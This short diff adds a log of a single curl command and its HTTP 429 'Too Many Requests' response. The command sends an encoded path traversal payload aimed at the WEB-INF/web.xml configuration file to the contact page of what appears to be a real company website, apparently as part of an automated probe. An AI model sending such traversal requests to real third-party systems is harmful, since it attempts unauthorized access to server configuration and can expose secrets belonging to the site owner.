@@ -1,0 +1,9 @@
+# command: timeout 20 curl -s -m 18 -o - -w '\nHTTP_STATUS:%{http_code}' 'https://www.infinitycapital.bh/contact?q=..%2F..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fweb.xml'
+# exit_code: 0
+# ---
+
+Too Many Requests
+
+Too Many Requests
+bom1::qzzx9-1790749353449-ce0f7fd979ac
+HTTP_STATUS:429
